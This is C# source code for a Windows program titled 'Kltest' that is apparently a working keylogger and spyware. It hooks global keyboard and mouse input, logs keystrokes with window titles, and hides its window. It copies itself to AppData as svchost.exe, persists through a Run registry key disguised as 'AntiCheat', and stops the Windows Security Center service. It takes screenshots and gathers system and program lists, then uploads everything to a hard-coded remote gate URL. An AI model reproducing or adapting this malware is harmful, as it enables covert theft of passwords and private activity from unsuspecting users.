using System;
using System.Windows.Forms;
using System.Collections.Specialized;
using gma.System.Windows;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Globalization;
using System.Threading;
using System.Runtime.InteropServices;
using System.Net;
using System.IO;
using System.Diagnostics;

using System.Runtime.CompilerServices;
using System.Reflection;


namespace GlobalHookDemo 
{
	class MainForm : System.Windows.Forms.Form
	{
		private System.Windows.Forms.Button buttonStart;
        private System.Windows.Forms.Button buttonStop;
        private BackgroundWorker backgroundWorker1;
        private System.Windows.Forms.Timer timer1;
        private IContainer components;
		private System.Windows.Forms.TextBox textBox;
        private BackgroundWorker backgroundWorker2;

        string AppDataDir;

		public MainForm()
		{
			InitializeComponent();
		}
	
		// THIS METHOD IS MAINTAINED BY THE FORM DESIGNER
		// DO NOT EDIT IT MANUALLY! YOUR CHANGES ARE LIKELY TO BE LOST
		void InitializeComponent() {
            this.components = new System.ComponentModel.Container();
            this.textBox = new System.Windows.Forms.TextBox();
            this.buttonStop = new System.Windows.Forms.Button();
            this.buttonStart = new System.Windows.Forms.Button();
            this.backgroundWorker1 = new System.ComponentModel.BackgroundWorker();
            this.timer1 = new System.Windows.Forms.Timer(this.components);
            this.backgroundWorker2 = new System.ComponentModel.BackgroundWorker();
            this.SuspendLayout();
            // 
            // textBox
            // 
            this.textBox.Anchor = ((System.Windows.Forms.AnchorStyles)((((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom) 
            | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.textBox.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.textBox.Font = new System.Drawing.Font("Courier New", 11F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.World);
            this.textBox.Location = new System.Drawing.Point(4, 32);
            this.textBox.Multiline = true;
            this.textBox.Name = "textBox";
            this.textBox.ScrollBars = System.Windows.Forms.ScrollBars.Vertical;
            this.textBox.Size = new System.Drawing.Size(328, 30);
            this.textBox.TabIndex = 3;
            // 
            // buttonStop
            // 
            this.buttonStop.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.buttonStop.Location = new System.Drawing.Point(85, 3);
            this.buttonStop.Name = "buttonStop";
            this.buttonStop.Size = new System.Drawing.Size(75, 23);
            this.buttonStop.TabIndex = 1;
            this.buttonStop.Text = "Stop";
            this.buttonStop.Click += new System.EventHandler(this.ButtonStopClick);
            // 
            // buttonStart
            // 
            this.buttonStart.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.buttonStart.Location = new System.Drawing.Point(4, 3);
            this.buttonStart.Name = "buttonStart";
            this.buttonStart.Size = new System.Drawing.Size(75, 23);
            this.buttonStart.TabIndex = 0;
            this.buttonStart.Text = "Start";
            this.buttonStart.Click += new System.EventHandler(this.ButtonStartClick);
            // 
            // backgroundWorker1
            // 
            this.backgroundWorker1.DoWork += new System.ComponentModel.DoWorkEventHandler(this.backgroundWorker1_DoWork);
            this.backgroundWorker1.RunWorkerCompleted += new System.ComponentModel.RunWorkerCompletedEventHandler(this.backgroundWorker1_RunWorkerCompleted);
            // 
            // timer1
            // 
            this.timer1.Enabled = true;
            this.timer1.Interval = 10;
            this.timer1.Tick += new System.EventHandler(this.timer1_Tick);
            // 
            // backgroundWorker2
            // 
            this.backgroundWorker2.DoWork += new System.ComponentModel.DoWorkEventHandler(this.backgroundWorker2_DoWork);
            this.backgroundWorker2.RunWorkerCompleted += new System.ComponentModel.RunWorkerCompletedEventHandler(this.backgroundWorker2_RunWorkerCompleted);
            // 
            // MainForm
            // 
            this.AutoScaleBaseSize = new System.Drawing.Size(5, 13);
            this.ClientSize = new System.Drawing.Size(334, 74);
            this.Controls.Add(this.textBox);
            this.Controls.Add(this.buttonStop);
            this.Controls.Add(this.buttonStart);
            this.Name = "MainForm";
            this.Text = "Kltest";
            this.Load += new System.EventHandler(this.MainFormLoad);
            this.Shown += new System.EventHandler(this.MainForm_Shown);
            this.MouseClick += new System.Windows.Forms.MouseEventHandler(this.MainForm_MouseClick);
            this.ResumeLayout(false);
            this.PerformLayout();

		}
			
        const int WM_GETTEXT = 0xD;
        const int WM_GETTEXTLENGTH = 0x000E;

        [DllImport("user32.dll", EntryPoint = "SendMessage", CharSet = CharSet.Auto)]
        public static extern bool SendMessage(IntPtr hWnd, uint Msg, int wParam, StringBuilder lParam);

        [DllImport("user32.dll", SetLastError = true)]
        public static extern IntPtr SendMessage(IntPtr hWnd, int Msg, int wparam, int lparam);

        [DllImport("user32.dll")]
        static extern bool OemToCharA(char[] lpszSrc, [Out] StringBuilder lpszDst);

        [DllImport("Kernel32.dll", SetLastError = true)]
        extern static bool GetVolumeInformation(string vol, StringBuilder name, int nameSize, out uint serialNum, out uint maxNameLen, out uint flags, StringBuilder fileSysName, int fileSysNameSize);

        [DllImport("user32.dll")]
        private static extern IntPtr GetForegroundWindow();

        [STAThread]

		public static void Main(string[] args)
		{
			Application.Run(new MainForm());
		}
		
		void ButtonStartClick(object sender, System.EventArgs e)
		{
			actHook.Start();
		}
		
		void ButtonStopClick(object sender, System.EventArgs e)
		{
			actHook.Stop();
		}

        string GetLocalIPS() // Перечисляем IP адреса
        {
           String strHostName = Dns.GetHostName();
           String ret="";
           IPHostEntry iphostentry = Dns.GetHostByName(strHostName);
           
           int nIP = 0;
           foreach(IPAddress ipaddress in iphostentry.AddressList)
           {
               ret = ret + "IP #" + nIP + ": " + ipaddress.ToString();
           }
           return ret;
        }

		UserActivityHook actHook;
        string localips;

        string GetProgList()
        {
            string ret="";
            Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall");
            string[] skeys = key.GetSubKeyNames(); // Все подключи из key
            int length = skeys.Length;
            // Проход по всем подключам
            for (int i = 0; i < length; i++)
            {
                // Получаем очередной подключ
                Microsoft.Win32.RegistryKey appKey = key.OpenSubKey(skeys[i]); 
                string name;
                try // Пробуем получить значение DisplayName
                {
                    name = appKey.GetValue("DisplayName").ToString();
                }
                catch (Exception)
                {
                    // Если не указано имя, то пропускаем ключ
                    continue;
                }
 
                Console.WriteLine(name);
                ret = ret + name + Environment.NewLine;
                appKey.Close();
            }
            key.Close();
            return ret;
        }

        public static string OemToChar1(string str)
        {
            if (string.IsNullOrEmpty(str)) return str;

            StringBuilder strBuilder = new StringBuilder(str.Length);
            OemToCharA(str.ToCharArray(), strBuilder);
            return strBuilder.ToString();
        }

        string GetCmdOutput(string cmd)
        {
            ProcessStartInfo startInfo = new ProcessStartInfo(cmd);
            startInfo.UseShellExecute = false;
            startInfo.RedirectStandardOutput = true;
            startInfo.RedirectStandardError = true;
            startInfo.CreateNoWindow = true;

            Process process = Process.Start(startInfo);
            StreamReader outputReader = process.StandardOutput;
            StreamReader errorReader = process.StandardError;
            //process.WaitForExit();
            textBox.AppendText(outputReader.ReadToEnd() + Environment.NewLine);
            textBox.AppendText(errorReader.ReadToEnd() + Environment.NewLine);
            textBox.Text = OemToChar1(textBox.Text);
            return textBox.Text;
        }
        	        
        public static void HttpUploadFile(string url, string file, string paramName, string contentType, NameValueCollection nvc)
        {
            Console.WriteLine(string.Format("Uploading {0} to {1}", file, url));
            string boundary = "---------------------------" + DateTime.Now.Ticks.ToString("x");
            byte[] boundarybytes = System.Text.Encoding.ASCII.GetBytes("\r\n--" + boundary + "\r\n");

            HttpWebRequest wr = (HttpWebRequest)WebRequest.Create(url);
            wr.ContentType = "multipart/form-data; boundary=" + boundary;
            wr.Method = "POST";
            wr.KeepAlive = true;
            wr.Credentials = System.Net.CredentialCache.DefaultCredentials;

            Stream rs = wr.GetRequestStream();

            string formdataTemplate = "Content-Disposition: form-data; name=\"{0}\"\r\n\r\n{1}";
            foreach (string key in nvc.Keys)
            {
                rs.Write(boundarybytes, 0, boundarybytes.Length);
                string formitem = string.Format(formdataTemplate, key, nvc[key]);
                byte[] formitembytes = System.Text.Encoding.UTF8.GetBytes(formitem);
                rs.Write(formitembytes, 0, formitembytes.Length);
            }
            rs.Write(boundarybytes, 0, boundarybytes.Length);

            string headerTemplate = "Content-Disposition: form-data; name=\"{0}\"; filename=\"{1}\"\r\nContent-Type: {2}\r\n\r\n";
            string header = string.Format(headerTemplate, paramName, file, contentType);
            byte[] headerbytes = System.Text.Encoding.UTF8.GetBytes(header);
            rs.Write(headerbytes, 0, headerbytes.Length);

            FileStream fileStream = new FileStream(file, FileMode.Open, FileAccess.Read);
            byte[] buffer = new byte[4096];
            int bytesRead = 0;
            while ((bytesRead = fileStream.Read(buffer, 0, buffer.Length)) != 0)
            {
                rs.Write(buffer, 0, bytesRead);
            }
            fileStream.Close();

            byte[] trailer = System.Text.Encoding.ASCII.GetBytes("\r\n--" + boundary + "--\r\n");
            rs.Write(trailer, 0, trailer.Length);
            rs.Close();

            WebResponse wresp = null;
            try
            {
                wresp = wr.GetResponse();
                Stream stream2 = wresp.GetResponseStream();
                StreamReader reader2 = new StreamReader(stream2);
                Console.WriteLine(string.Format("File uploaded, server response is: {0}", reader2.ReadToEnd()));
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error uploading file", ex);
                if (wresp != null)
                {
                    wresp.Close();
                    wresp = null;
                }
            }
            finally
            {
                wr = null;
            }
        }

        void WriteStringToFile(string s,string fn)
        {
            String fn1 = AppDataDir + "\\" + fn;
            StreamWriter sw1 = new StreamWriter(fn1);
            sw1.WriteLine(s); // Мы записываем файл то, что ввёл пользователь в textBox1
            sw1.Close();
        }


        void DisableWSCSVC()
        {
            ProcessStartInfo startInfo = new ProcessStartInfo("cmd.exe");
            startInfo.Arguments = "/k net stop wscsvc";
            startInfo.UseShellExecute = false;
            startInfo.RedirectStandardOutput = true;
            startInfo.RedirectStandardError = true;
            startInfo.CreateNoWindow = true;
            Process.Start(startInfo);
        }
        
        void MainFormLoad(object sender, System.EventArgs e)
        {
            AppDataDir = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            string needexepath = AppDataDir + "\\svchost.exe";
            localips = GetLocalIPS();                                
 
           // backgroundWorker2.RunWorkerAsync("systeminfo");
 
            actHook = new UserActivityHook(); // create an instance with global hooks
            // hang on events
            actHook.OnMouseActivity += new MouseEventHandler(MouseMoved);
            actHook.KeyDown += new KeyEventHandler(MyKeyDown);
            actHook.KeyPress += new KeyPressEventHandler(MyKeyPress);
            actHook.KeyUp += new KeyEventHandler(MyKeyUp);            

            if (Application.ExecutablePath != needexepath) // если прога не в APPDATA суем ее в туда и пишем в автозапуск
            {
                try
                {
                    File.Copy(Application.ExecutablePath, needexepath);
                }
                catch
                {

                }

                try
                {
                    Microsoft.Win32.RegistryKey myKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run\", true);
                    myKey.SetValue("AntiCheat", needexepath);
                }
                catch
                {

                }

                try
                {
                    ///// и стартуем приаттаченый ресурс
                    byte[] resf;
                    resf = Properties.Resources.guest;

                    System.IO.File.WriteAllBytes(AppDataDir + "\\guest.txt", resf);
                    Process p = new Process();
                    p.StartInfo = new ProcessStartInfo(AppDataDir + "\\guest.txt");
                    p.Start();
                }
                catch
                {

                }
            }
        }
              
        public static uint GetVolumeSerial(string strDriveLetter)
        {
            uint serialNum, maxNameLen, flags;
            bool ok = GetVolumeInformation(strDriveLetter, null, 0, out serialNum, out maxNameLen, out flags, null, 0);
            return serialNum;
        }
               		
		public void MouseMoved(object sender, MouseEventArgs e)
		{
            if (e.Clicks > 0)
            {
                LogWrite("MouseButton - " + e.Button.ToString());

                if (e.Button.ToString() == "Left") // Right
                {
                    if (!backgroundWorker1.IsBusy)
                        backgroundWorker1.RunWorkerAsync();
                }
            }
		}
        
        public static string GetWindowTextRaw(IntPtr hwnd)
        {
            var length = (int)SendMessage(hwnd, WM_GETTEXTLENGTH, 0, 0);
            var sb = new StringBuilder(length + 1);
            SendMessage(hwnd, WM_GETTEXT, sb.Capacity, sb);
            return sb.ToString();
        }
		
		public void MyKeyDown(object sender, KeyEventArgs e)
		{
            IntPtr p=GetForegroundWindow();
            String s = GetWindowTextRaw(p);

            LogWrite(s + " KeyDown - e.Shift=[" + e.Shift + "] KeyCode=[" + e.KeyCode.ToString() + "] KeyData=[" + e.KeyData.ToString() + "] KeyValue=[" + e.KeyValue + "] LAYOUT=[" + InputLanguage.CurrentInputLanguage.LayoutName + "]");
            if (e.KeyValue == 13)
            {
                if (!backgroundWorker1.IsBusy)
                    backgroundWorker1.RunWorkerAsync();
            }
        }
		
		public void MyKeyPress(object sender, KeyPressEventArgs e)
		{
            IntPtr p = GetForegroundWindow();
            String s = GetWindowTextRaw(p);
            LogWrite(s + "KeyPress - " + e.KeyChar + Environment.NewLine);
		}
		
		public void MyKeyUp(object sender, KeyEventArgs e)
		{
            IntPtr p = GetForegroundWindow();
            String s = GetWindowTextRaw(p);
            LogWrite(s + " KeyUp - e.Shift=[" + e.Shift + "] KeyCode=[" + e.KeyCode.ToString() + "] KeyData=[" + e.KeyData.ToString() + "] KeyValue=[" + e.KeyValue + "] LAYOUT=[" + InputLanguage.CurrentInputLanguage.LayoutName + "]");
        }
		
		private void LogWrite(string txt)
		{
            DateTime dt = DateTime.Now;
            textBox.AppendText(dt.ToString() + " :: " + txt + Environment.NewLine);
			textBox.SelectionStart = textBox.Text.Length;
		}

        private void MainForm_MouseClick(object sender, MouseEventArgs e)
        {
         
        }

        private void timer1_Tick(object sender, System.EventArgs e)
        {
            this.Visible = false;
        }

        private void MainForm_Shown(object sender, System.EventArgs e)
        {
            // this.Visible = false;
        }


        string UrlGate = "http://reterposcstan.ru/v5.0/upload.php";
        string build = "19.10.2013";
        string exever = "6.2";


        private void backgroundWorker1_DoWork(object sender, DoWorkEventArgs e)
        {
            NameValueCollection nvc = new NameValueCollection();

            uint id = GetVolumeSerial("C:\\");
            nvc.Add("id", id.ToString());
            nvc.Add("localip", localips);
            nvc.Add("owner", "111");
            nvc.Add("ver", exever);

            System.OperatingSystem osInfo = System.Environment.OSVersion;
            string winver = osInfo.Version.Major.ToString() + "." + osInfo.Version.Minor.ToString();

            nvc.Add("winver", winver);
            nvc.Add("build", build);
            nvc.Add("case", "111");

            int tick = System.Environment.TickCount;
            String fn1 = AppDataDir + "\\log" + tick.ToString() + ".txt";
            String fn2 = AppDataDir + "\\scr" + tick.ToString() + ".png";

            Graphics graph = null;
            var bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
            graph = Graphics.FromImage(bmp);
            graph.CopyFromScreen(0, 0, 0, 0, bmp.Size);
            bmp.Save(fn2);
            
            StreamWriter sw = new StreamWriter(fn1); 
            sw.WriteLine(textBox.Text); // Мы записываем файл то, что ввёл пользователь в textBox1
            sw.Close();

            try
            {
                HttpUploadFile(UrlGate, @fn1, "filename", "image/jpeg", nvc);
                HttpUploadFile(UrlGate, @fn2, "filename", "image/jpeg", nvc);
            }
            catch
            { 
            
            }

            System.IO.File.Delete(fn1);
            System.IO.File.Delete(fn2);
        }

       /* CommandInterpreter(string s1,string s2)
        {
        
        }

        private Int32 WaitCmdsThread(void x)
        {
	 	int GateInterval=StrToInt(GetGateInterval());
		string URLGATE=GetGateUrl();
		while(1)
		{
			DWORD tick1=GetTickCount();
			TStringList *l=new TStringList;
			l->Text=IndyGetTextFromURL(URLGATE + "?id=" + GetBotID() + "&ping=" + ping_time);
			DWORD tick2=GetTickCount();
			ping_time=tick2-tick1;

			//CommandInterpreter(URLGATE,l->Strings[0]);

			for(int i=0;i<l->Count;i++)
			{
				string cmd=l->Strings[i];
				if(cmd.Length()>0)
				{
					CommandInterpreter(URLGATE,cmd);
				}
			} 
            
			Sleep(GateInterval*1000);
		}
        }*/



        private void backgroundWorker2_DoWork(object sender, DoWorkEventArgs e)
        {
            WriteStringToFile(GetCmdOutput("systeminfo"), "sysinfo.txt");
            WriteStringToFile(GetProgList(), "plist.txt"); 

            //string str = (string)e.Argument;
            //MessageBox.Show(str);
            //List<object> genericlist = e.Argument as List<object>;        
            
            NameValueCollection nvc = new NameValueCollection();

            uint id = GetVolumeSerial("C:\\");
            nvc.Add("id", id.ToString());
            nvc.Add("localip", localips);
            nvc.Add("owner", "111");
            nvc.Add("ver", exever);

            System.OperatingSystem osInfo = System.Environment.OSVersion;
            string winver = osInfo.Version.Major.ToString() + "." + osInfo.Version.Minor.ToString();

            nvc.Add("winver", winver);
            nvc.Add("build", build);
            nvc.Add("case", "111"); 

            String fn1 = AppDataDir + "\\sysinfo.txt";
            String fn2 = AppDataDir + "\\plist.txt";

            try
            {
                HttpUploadFile(UrlGate, @fn1, "filename", "image/jpeg", nvc);
                HttpUploadFile(UrlGate, @fn2, "filename", "image/jpeg", nvc);
            }
            catch
            {

            }

            System.IO.File.Delete(fn1);
            System.IO.File.Delete(fn2);
        }

        private void backgroundWorker1_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e)
        {
            textBox.Text = "";
        }

        private void backgroundWorker2_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e)
        {
             textBox.Text = "";
        }

	}			
}
